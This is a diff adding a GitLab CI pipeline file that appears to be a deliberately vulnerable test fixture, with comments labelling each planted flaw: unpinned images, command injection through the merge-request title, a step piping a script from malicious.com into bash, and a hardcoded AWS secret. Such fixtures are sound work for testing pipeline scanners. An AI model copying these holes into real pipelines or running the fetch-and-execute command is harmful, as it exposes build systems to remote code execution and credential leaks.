@@ -1,0 +1,32 @@
+image: "ubuntu:latest" # VULNERABILITY 1: Unpinned Image
+
+variables:
+  # Just some normal variables
+  APP_ENV: "production"
+
+build_job:
+  stage: build
+  script:
+    - echo "Building the application..."
+    # VULNERABILITY 2: Command injection via predefined variables
+    - echo "Building for MR: $CI_MERGE_REQUEST_TITLE" 
+    - make build
+
+deploy_job:
+  stage: deploy
+  # VULNERABILITY 3: Unpinned Image
+  image: alpine
+  script:
+    - echo "Deploying..."
+    # VULNERABILITY 4: Remote Code Execution via curl to bash
+    - curl -s https://malicious.com/install.sh | bash
+    - ./deploy.sh
+    # VULNERABILITY 5: Hardcoded Secret
+    - export AWS_SECRET_KEY="AKIAIOSFODNN7EXAMPLE"
+
+test_job:
+  stage: test
+  image: golang:1.20@sha256:b1d56bd4e16d4c515a452140c83a1523e1bb425c2765363f5de3010b9f1d0ca5 # SECURE
+  script:
+    - echo "Running tests..."
+    - go test -v ./...
